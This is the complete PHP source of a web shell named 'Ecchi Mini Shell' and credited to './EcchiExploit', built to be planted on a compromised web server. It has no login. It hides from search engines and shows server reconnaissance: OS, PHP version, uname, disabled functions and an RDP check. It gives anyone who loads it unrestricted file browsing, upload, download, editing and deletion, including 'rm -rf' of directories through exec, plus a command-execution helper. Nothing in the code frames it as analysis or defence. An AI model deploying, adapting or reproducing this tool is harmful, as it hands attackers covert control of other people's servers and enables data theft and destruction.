<?php
header("X-XSS-Protection: 0");
set_time_limit(0);
error_reporting(0);
ini_set('max_execution_time', 0);
ini_set('output_buffering', 0);


if (version_compare(PHP_VERSION, '7.0.0', '<')) {
    set_magic_quotes_runtime(0);

    if (get_magic_quotes_gpc()) {
        function ecchi($array)
        {
            return is_array($array) ? array_map('ecchi', $array) : stripslashes($array);
        }
        $_POST = ecchi($_POST);
    }
} else {
    ini_set('magic_quotes_runtime', 0);
}

function w($dir, $perm)
{
    if (!is_writable($dir)) {
        return "<p class='text-danger'>" . $perm . "</p>";
    } else {
        return "<p class='text-warning'>" . $perm . "</p>";
    }
}

function r($dir, $perm)
{
    if (!is_readable($dir)) {
        return "<p class='text-danger'>" . $perm . "</p>";
    } else {
        return "<p class='text-warning'>" . $perm . "</p>";
    }
}

function getexist($cmd = null)
{
    if (function_exists('exec')) {
        $disable = exec($cmd);
    } else if (function_exists('shell_exec')) {
        $disable = shell_exec($cmd);
    } else if (function_exists('system')) {
        $disable = system($cmd);
    } else if (function_exists('passthru')) {
        $disable = passthru($cmd);
    } else {
        $disable = 'Disable';
    }

    return $disable;
}

function seorank($url)
{
    $setopt = array(
        CURLOPT_URL => 'https://www.checkmoz.com/bulktool',
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_POST => true,
        CURLOPT_POSTFIELDS => "getStatus=1&siteID=1&sitelink=$url&da=1&pa=1&alexa=1"
    );
    $ch = curl_init();
    curl_setopt_array($ch, $setopt);
    return curl_exec($ch);
    curl_close($ch);
}

function perms($file)
{
    $perms = fileperms($file);
    if (($perms & 0xC000) == 0xC000) {
        // Socket
        $info = 's';
    } elseif (($perms & 0xA000) == 0xA000) {
        // Symbolic Link
        $info = 'l';
    } elseif (($perms & 0x8000) == 0x8000) {
        // Regular
        $info = '-';
    } elseif (($perms & 0x6000) == 0x6000) {
        // Block special
        $info = 'b';
    } elseif (($perms & 0x4000) == 0x4000) {
        // Directory
        $info = 'd';
    } elseif (($perms & 0x2000) == 0x2000) {
        // Character special
        $info = 'c';
    } elseif (($perms & 0x1000) == 0x1000) {
        // FIFO pipe
        $info = 'p';
    } else {
        // Unknown
        $info = 'u';
    }
    // Owner
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));
    // Group
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));
    // World
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));
    return $info;
}

function getact($dir, $file, $label)
{
?>
    <label for="<?= $label ?>" class="font-weight-bold">
        Filename : <span class="text-secondary"><?= basename($file) ?></span>
        [ <a class="text-white text-decoration-none" href="?e=view&fol=<?= hex2bin($dir) . "&file=" . bin2hex($file) ?>">view</a> ]
        [ <a class="text-white text-decoration-none" href="?e=edit&fol=<?= hex2bin($dir) . "&file=" . bin2hex($file) ?>">edit</a> ]
        [ <a class="text-white text-decoration-none" href="?e=rename&fol=<?= hex2bin($dir) . "&file=" . bin2hex($file) ?>">rename</a> ]
        [ <a class="text-white text-decoration-none" href="?e=download&fol=<?= hex2bin($dir) . "&file=" . bin2hex($file) ?>">download</a> ]
        [ <a class="text-white text-decoration-none" href="?e=delete&fol=<?= hex2bin($dir) . "&file=" . bin2hex($file) ?>">delete</a> ]
    </label>
<?php
}

if (isset($_GET['fol'])) {
    if (ctype_xdigit($_GET['fol'])) {
        $dir = htmlspecialchars(bin2hex(hex2bin($_GET['fol'])));
        chdir($dir);
    } else {
        $dir = htmlspecialchars(bin2hex($_GET['fol']));
        chdir($dir);
    }
} else {
    $dir = bin2hex(getcwd());
}

$dir        = bin2hex(str_replace("\\", "/", hex2bin($dir)));
$scdir      = explode("/", hex2bin($dir));
$scan       = scandir(hex2bin($dir));
$disable    = @ini_get('disable_functions');
$disable    = (!empty($disable)) ? "<font class='text-danger'>$disable</font>" : '<font style="color: #43C6AC">NONE</font>';
$os         = substr(strtoupper(PHP_OS), 0, 3) === "WIN" ? "Windows" : "Linux";
$checkrdp   = ($os !== 'Windows' && getexist() !== 'Disable') ? "Can't Create RDP" : 'Vuln To Create RDP';
$getrank    = preg_match_all('/(.*?)<\/td>/', $rank, $get);
$check      = preg_replace('/<td>/', '', $get[1]);

?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="nofollow, noindex, noarchive">
    <meta name="googlebot" content="nofollow, noindex, noarchive">
    <meta name="googlebot-news" content="nosnippet">
    <meta name="author" content="./EcchiExploit">

    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.datatables.net/1.11.3/css/dataTables.bootstrap5.min.css">
    <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.15.3/css/all.css">
    <title>Ecchi Mini Shell</title>
</head>

<style type="text/css">
    p>span {
        color: #43C6AC;
    }

    th:hover {
        color: #00ffff !important;
        cursor: default;
    }

    td a:hover,
    .folder:hover,
    a p:hover,
    label a:hover,
    td i {
        color: #00ffff !important;
    }

    div.form-group button:hover {
        background-color: #00ffff;
        border: 1px solid #00ffff;
    }

    .page-item.active .page-link {
        background-color: transparent !important;
        border: 1px solid #00ffff;
    }

    .page-link {
        background-color: transparent !important;
    }
</style>

<body class="bg-dark text-white">
    <nav class="navbar navbar-expand-md bg-dark navbar-light mt-2">
        <div class="container">
            <div class="col-md">
                <a class="navbar-brand text-white" href="<?= $_SERVER['PHP_SELF'] ?>">
                    <h5>./EcchiExploit</h5>
                </a>
            </div>
            <div class="col-md-3">
                <button class="btn btn-secondary" type="button" data-bs-toggle="offcanvas" data-bs-target="#infoser" aria-controls="infoser">Information Server</button>
                <button class="btn btn-secondary" type="button" data-bs-toggle="modal" data-bs-target="#fileupload">UPLOAD</button>
            </div>
        </div>

        <div class="modal fade" id="fileupload" tabindex="-1" aria-labelledby="filelabel" aria-hidden="true">
            <div class="modal-dialog modal-dialog-centered">
                <div class="modal-content bg-dark">
                    <div class="modal-header">
                        <h5 class="modal-title" id="filelabel">File Uploaded</h5>
                        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal" aria-label="Close">&#x2715;</button>
                    </div>
                    <div class="modal-body">
                        <form method="POST" enctype="multipart/form-data">
                            <div class="input-group">
                                <input type="file" class="form-control" name="file" onchange="this.form.submit()">
                            </div>
                            <!-- <button class="btn btn-secondary form-control mt-2" type="submit">Submit</button> -->
                        </form>
                        <?php
                        if (isset($_FILES['file'])) {
                            if (move_uploaded_file($_FILES['file']['tmp_name'], hex2bin($dir) . "/" . $_FILES['file']['name'])) {
                                $title = "File Upload Success";
                                echo "<div id='alert' hidden>success</div>";
                                echo "<script>window.location = '?fol=" . $dir . "'</script>";
                            } else {
                                $title = "File Upload Failed";
                                echo "<div id='alert' hidden>permission denied</div>";
                            }
                        }
                        ?>
                    </div>
                    <div class="modal-footer">
                        <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Close</button>
                    </div>
                </div>
            </div>
        </div>

        <div class="offcanvas offcanvas-start text-dark" tabindex="-1" id="infoser" aria-labelledby="infoserlab">
            <div class="offcanvas-header">
                <h5 class="offcanvas-title" id="infoserlab">Server Info</h5>
                <button type="button" class="btn-close text-reset" data-bs-dismiss="offcanvas" aria-label="Close"></button>
            </div>
            <div class="offcanvas-body small">
                <p>
                    Rank Alexa : <span><?= $check[4] ?></span> |
                    DA : <span><?= $check[2] ?></span> |
                    PA : <span><?= $check[3] ?></span>
                </p>
                <p>OS : <span><?= $os ?></span></p>
                <p>RDP : <span><?= $checkrdp ?></span></p>
                <p>PHP Version : <span><?= PHP_VERSION ?></span></p>
                <p>Software : <span><?= $_SERVER['SERVER_SOFTWARE'] ?></span></p>
                <p>Information System : <span><?= php_uname() ?></span></p>
                <p>Disable Function : <span class="text-wrap"><?= $disable ?></span></p>
            </div>
        </div>
    </nav>
    <div class="container">
        <div class="row justify-content-center mt-2">
            <div class="col-md-12">
                <label for="dir">You In Here :</label>
                <?php
                foreach ($scdir as $c_dir => $cdir) {
                    echo "<a class='font-weight-bold text-decoration-none folder' id='dir' href='?fol=";
                    for ($i = 0; $i <= $c_dir; $i++) {
                        echo hex2bin(bin2hex($scdir[$i]));
                        if ($i != $c_dir) {
                            echo "/";
                        }
                    }
                    echo "'>" . $cdir . "</a>/";
                }
                if (isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['e'] == 'download')) {
                    @ob_clean();
                    $file = hex2bin($_GET['file']);
                    header('Content-Description: File Transfer');
                    header('Content-Type: application/octet-stream');
                    header('Content-Disposition: attachment; filename="' . basename($file) . '"');
                    header('Expires: 0');
                    header('Cache-Control: must-revalidate');
                    header('Pragma: public');
                    header('Content-Length: ' . filesize($file));
                    readfile($file);
                    exit;
                } else if ($_GET['e'] == 'delete_dir') {
                    if (is_dir(hex2bin($dir))) {
                        if (is_writable(hex2bin($dir))) {
                            @rmdir(hex2bin($dir));
                            @exec("rm -rf " . hex2bin($dir));
                            @exec("rmdir /s /q " . hex2bin($dir));

                            $alert = "success";
                            $title = "Delete Success";

                            echo "<script>window.location='?fol=" . bin2hex(dirname(hex2bin($dir))) . "';</script>";
                            exit;
                        } else {
                            $alert = "permission denied";
                            $title = "could not remove " . basename(hex2bin($dir));
                        }
                    }
                ?>
                    <div class="form-group">
                        <div id="alert" hidden><?= $alert ?></div>
                    </div>
                <?php
                } else if ($_GET['e'] == 'rename') {
                    $alert = 'Rename File';
                    if ($_POST['rename']) {
                        $rename = rename(hex2bin($_GET['file']), hex2bin($dir) . "/" . htmlspecialchars($_POST['rename']));
                        if ($rename) {
                            $alert = "success";
                            $title = "Success Rename File";
                            echo "<script>window.location='?dir=" . bin2hex(hex2bin($dir)) . "';</script>";
                        } else {
                            $alert = "permission denied";
                            $title = "Denied Permission";
                        }
                    }
                ?>
                    <form method="POST">
                        <div class="form-group">
                            <?= getact($dir, hex2bin($_GET['file']), 'rename') ?>
                            <input id="rename" type="text" name="rename" class="form-control bg-dark text-danger mb-2 mt-2" value="<?= basename(hex2bin($_GET['file'])) ?>">
                        </div>
                        <div class="form-group">
                            <div id="alert" hidden><?= $alert ?></div>
                            <button class="btn btn-light form-control">Rename</button>
                        </div>
                    </form>
                <?php
                } else if ($_GET['e'] == 'rename_dir') {
                    $alert = 'Rename Directory';
                    if ($_POST['rename_dir']) {
                        $dir_rename = rename(hex2bin($dir), "" . dirname(hex2bin($dir)) . "/" . htmlspecialchars($_POST['rename_dir']) . "");
                        if ($dir_rename) {
                            $alert = "Success";
                            $title = "Rename Dir Success";
                            echo "<script>window.location='?fol=" . bin2hex(dirname(hex2bin($dir))) . "';</script>";
                        } else {
                            $alert = "permission denied";
                        }
                    }
                ?>
                    <form method="POST">
                        <div class="form-group">
                            <input name="rename_dir" type="text" class="form-control bg-dark text-danger mb-2 mt-2" value="<?= basename(hex2bin($dir)) ?>">
                        </div>
                        <div class="form-group">
                            <div id="alert" hidden><?= $alert ?></div>
                            <button type="submit" class="btn btn-light form-control">Renamed!!</button>
                        </div>
                    </form>
                <?php
                } else if ($_GET['e'] == 'delete') {
                    $delete = unlink(hex2bin($_GET['file']));
                    if ($delete) {
                        $alert = "success";
                        $title = "Success Delete File" . hex2bin($_GET['file']);
                        echo "<script>window.location ='?fol=" . bin2hex(hex2bin($dir)) . "';</script>";
                    } else {
                        $alert = "permission denied";
                        $title = "Denied Permission";
                    }
                ?>
                    <div class="form-group">
                        <div id="alert" hidden><?= $alert ?></div>
                    </div>
                <?php
                } else if ($_GET['e'] == 'edit') {
                    $alert = "Edit File";
                    if ($_POST['src']) {
                        $save = file_put_contents(hex2bin($_GET['file']), $_POST['src']);
                        if ($save) {
                            $alert = "success";
                            $title = "Saved!";
                        } else {
                            $alert = "permission denied";
                            $title = "Denied Permission";
                        }
                    }
                ?>
                    <form method="POST">
                        <div class="form-group">
                            <?= getact($dir, hex2bin($_GET['file']), 'textarea') ?>
                            <textarea class="form-control bg-dark text-danger mb-2 mt-2" spellcheck="false" name="src" id="textarea" rows="10"><?= htmlspecialchars(@file_get_contents(hex2bin($_GET['file']))) ?></textarea>
                        </div>
                        <div class="form-group">
                            <div id="alert" hidden><?= $alert ?></div>
                            <button type="submit" class="btn btn-light form-control">Save</button>
                        </div>
                    </form>
                <?php
                } else if ($_GET['e'] == 'view') {
                    $alert = "View File";
                ?>
                    <div class="form-group">
                        <?= getact($dir, hex2bin($_GET['file']), 'file') ?>
                        <textarea class="form-control bg-dark text-danger mb-2 mt-2" id="file" rows="5" readonly><?= htmlspecialchars(@file_get_contents(hex2bin($_GET['file']))) ?></textarea>
                    </div>
                    <div id="alert" hidden><?= $alert ?></div>
                <?php
                } else if ($_GET['e'] == 'newfolder') {
                    $alert = 'Create New Folder';
                    if ($_POST['new_folder']) {
                        $newfolder = hex2bin($dir) . '/' . htmlspecialchars($_POST['new_folder']);
                        if (!mkdir($newfolder)) {
                            $alert = "permission denied";
                            $title = "Denied Permission";
                        } else {
                            $alert = "success";
                            $title = "Success Create Folder";
                            echo "<script>window.location='?fol=" . bin2hex(hex2bin($dir)) . "';</script>";
                        }
                    }
                ?>
                    <form method="POST">
                        <div class="form-group">
                            <input type="text" name="new_folder" class="bg-dark text-danger form-control mb-2 mt-2" placeholder="name folder" required>
                        </div>
                        <div class="form-group">
                            <div id="alert" hidden><?= $alert ?></div>
                            <button type="submit" class="btn btn-light form-control">Submit</button>
                        </div>
                    </form>
                <?php
                } else if ($_GET['e'] == 'newfile') {
                    $alert = "Create New File";
                    if ($_POST['new_file']) {
                        $newfile = htmlspecialchars($_POST['new_file']);
                        $fopen = fopen($newfile, "a+");
                        if ($fopen) {
                            $alert = 'success';
                            $title = "Success Create File";
                            echo '<script>window.location = "?e=edit&fol=' . bin2hex(hex2bin($dir)) . '&file=' . bin2hex($_POST['new_file']) . '";</script>';
                        } else {
                            $alert = "permission denied";
                            $title = "Denied Permission";
                        }
                    }
                ?>
                    <form method="POST">
                        <div class="form-group">
                            <input type="text" name="new_file" class="bg-dark text-danger form-control mb-2 mt-2" placeholder="name file" value="<?= hex2bin($dir) . "/newfile.php" ?>" required>
                        </div>
                        <div class="form-group">
                            <div id="alert" hidden><?= $alert ?></div>
                            <button type="submit" class="btn btn-light form-control">Submit</button>
                        </div>
                    </form>
                    <?php
                }
                if (is_dir(hex2bin($dir)) == true) {
                    if (!is_readable(hex2bin($dir))) {
                        echo "<p class='font-weight-bold text-danger'>can't open directory. ( not readable )</p>";
                    } else {
                    ?>
                        <div class="table-responsive mt-3">
                            <table class="table table-bordered table-striped table-hover" id="table">
                                <thead class="thead-white text-white text-center">
                                    <tr>
                                        <th>Name</th>
                                        <th>Filetype</th>
                                        <th>Perm</th>
                                        <th>Option</th>
                                    </tr>
                                </thead>
                                <tbody>
                                    <?php
                                    foreach ($scan as $direc) {
                                        $dtype = filetype(hex2bin($dir) . "/$direc");
                                        if ($direc === '..') {
                                            $href = "<a class='text-decoration-none' href='?fol=" . bin2hex(dirname(hex2bin($dir))) . "'>$direc</a>";
                                        } else if ($direc === '.') {
                                            $href = "<a class='text-decoration-none' href='?fol=" . bin2hex(hex2bin($dir)) . "'>$direc</a>";
                                        } else {
                                            $href = "<a class='text-decoration-none' href='?fol=" . bin2hex(hex2bin($dir) . "/" . $direc) . "'>$direc</a>";
                                        }
                                        if ($direc === '.' || $direc === '..') {
                                            $act_dir = "<a class='text-decoration-none' href='?e=newfile&fol=" . bin2hex(hex2bin($dir)) . "'>newfile</a> | <a class='text-decoration-none' href='?e=newfolder&fol=" . bin2hex(hex2bin($dir)) . "'>newfolder</a>";
                                        } else {
                                            $act_dir = "<a class='text-decoration-none' href='?e=rename_dir&fol=" . bin2hex(hex2bin($dir) . "/" . $direc) . "'>rename</a> | <a class='text-decoration-none' href='?e=delete_dir&fol=" . bin2hex(hex2bin($dir) . "/" . $direc) . "'>delete</a>";
                                        }
                                        if (!is_dir(hex2bin($dir) . "/$direc")) continue;
                                    ?>
                                        <tr>
                                            <td class="border-light">
                                                <i class="fa-fw far fa-folder"></i>
                                                <?= $href ?>
                                            </td>
                                            <td class="border-light text-white text-center"><?= $dtype ?></td>
                                            <td class="border-light text-center">
                                                <?= w(hex2bin($dir) . "/$direc", perms(hex2bin($dir) . "/$direc")) ?>
                                            </td>
                                            <td class="border-light text-danger"><?= $act_dir ?></td>
                                        </tr>
                                <?php
                                    }
                                }
                            } else {
                                echo "<p class='font-weight-bold text-danger'>can't open directory.</p>";
                            }
                            foreach ($scan as $file) {
                                $infoext = pathinfo($file);
                                $ftype = filetype(hex2bin($dir) . "/$file");

                                if ($infoext['extension'] == 'php') {
                                    $i = '<i class="fa-fw fab fa-php"></i>';
                                    $ftype = 'php';
                                } else if ($infoext['extension'] == 'html' || $infoext['extension'] == 'htm') {
                                    $i = '<i class="fab fa-fw fa-html5"></i>';
                                    $ftype = 'html';
                                } else if ($infoext['extension'] == 'zip' || $infoext['extension'] == 'rar') {
                                    $i = '<i class="fas fa-fw fa-file-archive"></i>';
                                    $ftype = ($infoext['extension'] == 'zip') ? 'zip' : 'rar';
                                } else if ($infoext['extension'] == 'jpg' || $infoext['extension'] == 'jpeg' || $infoext['extension'] == 'png') {
                                    $i = '<i class="fas fa-fw fa-file-image"></i>';
                                    $ftype = 'image';
                                } else if ($infoext['extension'] == 'txt') {
                                    $i = '<i class="far fa-fw fa-file-code"></i>';
                                    $ftype = 'text file';
                                } else if ($infoext['extension'] == 'css') {
                                    $i = '<i class="fab fa-fw fa-css3-alt"></i>';
                                    $ftype = 'css';
                                } else if ($infoext['extension'] == 'js') {
                                    $i = '<i class="fab fa-fw fa-js-square"></i>';
                                    $ftype = 'js';
                                } else if ($infoext['extension'] == 'doc' || $infoext['extension'] == 'docx') {
                                    $i = '<i class="fab fa-fw fa-js-square"></i>';
                                    $ftype = ($infoext['extension'] == 'doc') ? 'doc' : 'docx';
                                } else if ($infoext['extension'] == 'pdf') {
                                    $i = '<i class="fas fa-file-pdf"></i>';
                                    $ftype = 'pdf';
                                } else if ($infoext['extension'] == 'py') {
                                    $i = '<i class="fab fa-fw fa-python"></i>';
                                    $ftype = 'python';
                                } else if ($infoext['extension'] == 'mp4' || $infoext['extension'] == 'mp3') {
                                    $i = ($infoext['extension'] == 'mp4') ? '<i class="fas fa-fw fa-file-video"></i>' : '<i class="fas fa-fw fa-file-audio"></i>';
                                    $ftype = ($infoext['extension'] == 'mp4') ? 'video' : 'audio';
                                } else if ($infoext['extension'] == 'htaccess' || $infoext['extension'] == 'ini') {
                                    $i = '<i class="fas fa-fw fa-cog"></i>';
                                    $ftype = ($infoext['extension'] == 'htaccess') ? 'htaccess' : 'configuration file';
                                } else {
                                    $i = '<i class="fas fa-fw fa-file"></i>';
                                }

                                if (!is_file(hex2bin($dir) . "/$file")) continue;
                                ?>
                                <tr>
                                    <td class="border-light">
                                        <?= $i ?>
                                        <a class="text-decoration-none" href="?e=view&fol=<?= bin2hex(hex2bin($dir)) . "&file=" . bin2hex(hex2bin($dir) . "/$file") ?>"><?= $file ?></a>
                                    </td>
                                    <td class="text-center text-white"><?= $ftype ?></td>
                                    <td class="text-center">
                                        <?= w(hex2bin($dir) . "/$file", perms(hex2bin($dir) . "/$file")) ?>
                                    </td>
                                    <td class="text-danger border-light">
                                        <a class="text-decoration-none" href="?e=edit&fol=<?= bin2hex(hex2bin($dir)) . "&file=" . bin2hex(hex2bin($dir) . "/$file") ?>">edit</a> |
                                        <a class="text-decoration-none" href="?e=rename&fol=<?= bin2hex(hex2bin($dir)) . "&file=" . bin2hex(hex2bin($dir) . "/$file") ?>">rename</a> |
                                        <a class="text-decoration-none" href="?e=delete&fol=<?= bin2hex(hex2bin($dir)) . "&file=" . bin2hex(hex2bin($dir) . "/$file") ?>">delete</a> |
                                        <a class="text-decoration-none" href="?e=download&fol=<?= bin2hex(hex2bin($dir)) . "&file=" . bin2hex(hex2bin($dir) . "/$file") ?>">download</a>
                                    </td>
                                </tr>
                            <?php } ?>
                                </tbody>
                            </table>
                        </div>
            </div>
        </div>
    </div>

    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.2/dist/umd/popper.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.min.js"></script>
    <script src="//cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <script src="https://cdn.datatables.net/1.11.3/js/jquery.dataTables.min.js"></script>
    <script src="https://cdn.datatables.net/1.11.3/js/dataTables.bootstrap5.min.js"></script>

    <script>
        $(document).ready(function() {
            $('#table').DataTable({
                language: {
                    search: "_INPUT_",
                    searchPlaceholder: "Search..."
                },
                pageLength: 7,
                lengthMenu: [
                    [5, 7, 10, 20],
                    [5, 7, 10, 20]
                ]
            });


            if ($('#alert').text() !== '') {
                let alert = $('#alert').text();
                if (alert == 'success') {
                    Swal.fire({
                        icon: 'success',
                        title: '<?= $title ?>',
                    });
                } else if (alert == 'permission denied') {
                    Swal.fire({
                        icon: 'error',
                        title: '<?= $title ?>'
                    });
                } else {
                    Swal.fire({
                        icon: "info",
                        title: "<?= $alert ?>"
                    });
                }
            }
        });
    </script>
</body>

</html>